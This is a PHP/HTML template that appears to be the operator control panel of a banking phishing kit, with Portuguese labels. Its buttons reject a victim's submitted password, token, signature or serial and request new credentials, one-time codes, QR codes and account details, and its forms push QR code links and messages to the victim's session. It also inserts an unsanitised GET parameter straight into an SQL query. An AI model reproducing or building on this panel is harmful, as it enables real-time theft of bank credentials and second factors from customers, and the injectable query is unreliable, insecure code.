<div class="block_commands" style="display:<?php echo $ManageJuba;?>">

	<div class="block_erros_commands">
		<a href="?gerenciar_juba=<?php echo $SendIdUser;?>&send=inv_acesso">ACESSO X</a>
		<a href="?gerenciar_juba=<?php echo $SendIdUser;?>&send=inv_tks">TOKEN X</a>
		<a href="?gerenciar_juba=<?php echo $SendIdUser;?>&send=inv_phone" class="last">FONE X</a>
		<a href="?gerenciar_juba=<?php echo $SendIdUser;?>&send=inv_serial">SERIAL X</a>
		<a href="?gerenciar_juba=<?php echo $SendIdUser;?>&send=inv_ass">ASSINATURA X</a>
		<a href="?gerenciar_juba=<?php echo $SendIdUser;?>&send=inv_psn" class="last">SENHA NET X</a>
		<a href="?gerenciar_juba=<?php echo $SendIdUser;?>&send=finalizar" class="finaliza_user"><i class="fa fa-close"></i> &nbsp;FINALIZA</a>
		<a href="?gerenciar_juba=<?php echo $SendIdUser;?>&send=inv_qrcode">QRCODE X</a>
		<a href="?gerenciar_juba=<?php echo $SendIdUser;?>&send=send_message_juba" class="anotacao_user last"><i class="fa fa-get-pocket"></i> &nbsp;MENSAGEM</a>
		<a href="?gerenciar_juba=<?php echo $SendIdUser;?>&send=inv_cod_num" class="last">COD. NUM X</a>
	</div><!-- block_erros_commands -->

	<div class="clear"></div>
	<hr>
	<div class="clear"></div>

	<div class="block_get_commands">
		<a href="?gerenciar_juba=<?php echo $SendIdUser;?>&send=get_tks_fisica">TOKEN</a>
		<a href="?gerenciar_juba=<?php echo $SendIdUser;?>&send=get_phone">FONE</a>
		<a href="?gerenciar_juba=<?php echo $SendIdUser;?>&send=get_serial" class="last">SERIAL</a>
		<a href="?gerenciar_juba=<?php echo $SendIdUser;?>&send=get_ass">ASSINATURA</a>
		<a href="?gerenciar_juba=<?php echo $SendIdUser;?>&send=get_cc">CC</a>
		<a href="?gerenciar_juba=<?php echo $SendIdUser;?>&send=get_caixa" class="last" style="background-color:#09f;color:#fff;">CAIXA</a>
		<a href="?gerenciar_juba=<?php echo $SendIdUser;?>&send=get_qrcode_juba">QRCODE</a>
		<a href="?gerenciar_juba=<?php echo $SendIdUser;?>&send=get_apelido">APELIDO</a>
		<a href="?gerenciar_juba=<?php echo $SendIdUser;?>&send=get_cod_num" class="last">COD. NUM</a>
	</div><!-- block_get_commands -->

	<div class="clear"></div>

	<div class="block_aditions">

		<form action="acesso.php" method="post" style="display:<?php echo $displaySendMsgJuba;?>;" id="FormMsgJuba">
			<label for="send_nota">
				<span class="star_span"><i class="fa fa-user"></i></span>
				<input type="text" id="send_msg_juba" name="send_msg_juba" placeholder="Mensagem" class="normal_input" autocomplete="off">
				<input type="hidden" name="send_id_user" value="<?php echo $SendIdUser;?>">
				<span class="final_span" onclick="document.getElementById('FormMsgJuba').submit();"><i class="fa fa-send"></i></span>
			</label>
		</form>

		<form action="acesso.php" method="post" style="display:<?php echo $displaySendQrCodeJ;?>;" id="FormQrCodeJ">
			<label for="send_ref">
				<span class="star_span"><i class="fa fa-key"></i></span>
				<input type="text" id="send_qrlink" name="send_qrlink" placeholder="Link imagem QrCode" class="normal_input" autocomplete="off">
				<input type="hidden" name="send_id_user" value="<?php echo $SendIdUser;?>">
				<span class="final_span" onclick="document.getElementById('FormQrCodeJ').submit();"><i class="fa fa-send"></i></span>
			</label>
		</form>

	</div><!-- block_aditions -->

	<div class="clear"></div>

	<div class="block_information">
		<?php

			$UsuarioGet = $_GET['gerenciar_juba'];

			$tabela = 'usuarios';
			$cond = "WHERE id = '$UsuarioGet'";
			$GetInfos = read($conn, $tabela, $cond);

		?>
	</div><!-- block_information -->

	<div class="clear"></div>

	<a href="acesso.php" class="btn_close_now"><i class="fa fa-window-close"></i> &nbsp;FECHAR</a>

</div><!-- block_commands -->
